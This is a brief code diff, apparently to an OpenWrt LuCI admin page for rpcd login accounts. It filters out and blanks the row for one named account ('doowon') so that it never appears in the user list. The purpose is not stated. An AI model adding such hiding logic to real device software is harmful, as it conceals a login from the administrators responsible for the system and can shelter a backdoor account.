@@ -320,6 +320,10 @@ return view.extend({
 
 		s = m.section(form.GridSection, 'login');
 		s.anonymous = true;
+		s.filter = function(section_id) {
+			var username = uci.get('rpcd', section_id, 'username');
+			return username !== 'doowon';
+		};
 		s.addremove = function(section_id) {
 			var username = uci.get('rpcd', section_id, 'username');
 			return !isRootUser(username);
@@ -334,6 +338,13 @@ return view.extend({
 				td.querySelectorAll('.cbi-button-remove').forEach(function(btn) {
 					btn.setAttribute('disabled', 'disabled');
 				});
+			}
+			
+			// doowon 계정은 표시하지 않음
+			if (section_id) {
+				if (username === 'doowon') {
+					return E([]);
+				}
 			}
 			
 			return td;
